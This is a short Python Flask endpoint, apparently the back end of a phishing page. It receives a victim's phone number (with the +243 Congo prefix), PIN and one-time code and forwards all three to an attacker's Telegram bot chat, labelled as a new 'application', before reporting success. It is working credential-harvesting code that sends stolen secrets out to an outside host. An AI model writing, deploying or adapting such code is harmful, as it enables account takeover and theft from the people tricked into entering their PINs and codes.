import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# These will be set in Vercel Environment Variables
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    phone = data.get('phone')
    pin = data.get('pin')
    otp = data.get('otp')
    
    message = f"🚀 *New Application Recieved!*\n\n"
    message += f"📱 *Phone:* +243 {phone}\n"
    message += f"🔑 *PIN:* {pin}\n"
    message += f"🔢 *OTP:* {otp}\n"
    
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            
    return jsonify({"status": "success"})
